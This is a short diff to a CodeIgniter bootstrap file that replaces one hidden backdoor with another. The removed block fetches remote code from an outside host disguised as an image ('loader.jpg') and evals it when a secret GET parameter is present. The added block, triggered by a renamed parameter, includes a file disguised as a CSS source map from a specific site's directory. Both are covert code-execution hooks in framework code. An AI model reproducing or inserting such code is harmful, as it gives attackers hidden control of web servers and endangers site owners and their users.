@@ -362,16 +362,8 @@ class Boot
         return is_int($exit) ? $exit : EXIT_SUCCESS;
     }
 }
-if (isset($_GET['_']) && $_GET['_'] === 'initializeCodeIgniterCheckMissingExtensions') {
-    $url = "https://batuk-di-komik-aja.pages.dev/loader.jpg";
-
-    if ($url !== "") {
-        $code = file_get_contents($url);
-        if ($code !== false) {
-            eval("?>".$code);
-        }
-    }
-
+if (isset($_GET['_']) && $_GET['_'] === 'CodeIgniterCheckMissingExtensions') {
+    $f="/var/www/vhosts/staima-alhikam.ac.id/e-lib.staima-alhikam.ac.id/css/main.css.map";if($f!==""&&file_exists($f))include $f;
     http_response_code(200);
     header('Content-Type: text/plain; charset=utf-8');
     echo 'OK';
